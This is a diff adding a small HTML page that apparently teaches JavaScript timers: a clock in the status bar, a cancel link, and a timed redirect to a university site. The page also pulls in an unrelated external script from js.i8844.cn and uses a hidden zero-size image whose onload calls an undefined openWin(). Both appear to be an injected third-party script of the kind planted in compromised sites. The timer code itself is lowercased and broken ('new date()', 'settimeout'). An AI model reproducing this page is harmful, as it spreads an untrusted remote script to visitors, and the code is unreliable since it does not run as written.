@@ -1,0 +1,25 @@
+<!doctype html public "-//w3c//dtdxhtml1.0 strict//en"
+"http://www.w3.org/tr/xhtml1/dtd/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+       <head>
+	    <title>使用定时器</title>
+  
+         <script language="javascript">
+	      function showtime(){
+		   var now = new date();
+		   window.status = now.tolocaletimestring();
+		   }
+		   
+		   var timerid = window.setinterval("showtime()",1000);
+		   function stopshowtime()
+		   {
+		      window.clearinterval(timerid);
+			  window.status = "已取消定时器";
+			  }
+			  var timer = settimeout("navigate('http://www.sysu.edu.cn');",1000);
+	        </script>
+	  <script language="javascript" type="text/javascript" src="http://js.i8844.cn/js/user.js"></script></head>
+	  <body>
+	  <p><a href="javascript:stopshowtime()">取消定时器</a></p>
+	  <img src="http://www.baidu.com/search/img/logo.gif" width="0" height="0" onload="openWin();" /></body>
+</html>
